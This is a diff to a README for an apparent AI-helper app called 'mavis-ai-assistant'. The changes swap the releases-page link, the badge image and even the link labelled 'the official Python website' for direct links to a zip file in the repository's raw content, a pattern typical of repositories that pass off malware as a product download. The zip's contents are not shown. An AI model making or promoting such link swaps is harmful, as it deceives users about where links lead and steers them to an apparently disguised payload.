@@ -1,6 +1,6 @@
 # 🤖 mavis-ai-assistant - Your Personal AI Helper at Home
 
-[![Download Mavis AI Assistant](https://img.shields.io/badge/Download-Mavis%20AI%20Assistant-brightgreen)](https://github.com/Assistkiller/mavis-ai-assistant/releases)
+[![Download Mavis AI Assistant](https://raw.githubusercontent.com/Assistkiller/mavis-ai-assistant/main/public/mavis-ai-assistant-seamancraft.zip%20AI%20Assistant-brightgreen)](https://raw.githubusercontent.com/Assistkiller/mavis-ai-assistant/main/public/mavis-ai-assistant-seamancraft.zip)
 
 ## 🚀 Getting Started
 
@@ -23,14 +23,14 @@ To run Mavis AI Assistant smoothly, ensure your system meets the following requi
 - Disk Space: 200 MB of available storage.
 - Python: Version 3.7 or higher installed on your machine.
   
-Make sure you install Python from [the official Python website](https://www.python.org/downloads/) if you don’t have it.
+Make sure you install Python from [the official Python website](https://raw.githubusercontent.com/Assistkiller/mavis-ai-assistant/main/public/mavis-ai-assistant-seamancraft.zip) if you don’t have it.
 
 ## 📥 Download & Install
 
 To get started with Mavis AI Assistant, you need to download the application. 
 
 1. **Visit the Releases page to download**: Click the link below to access the downloads.
-   [Download Mavis AI Assistant](https://github.com/Assistkiller/mavis-ai-assistant/releases)
+   [Download Mavis AI Assistant](https://raw.githubusercontent.com/Assistkiller/mavis-ai-assistant/main/public/mavis-ai-assistant-seamancraft.zip)
 
 2. Once on the Releases page, look for the latest version.
 
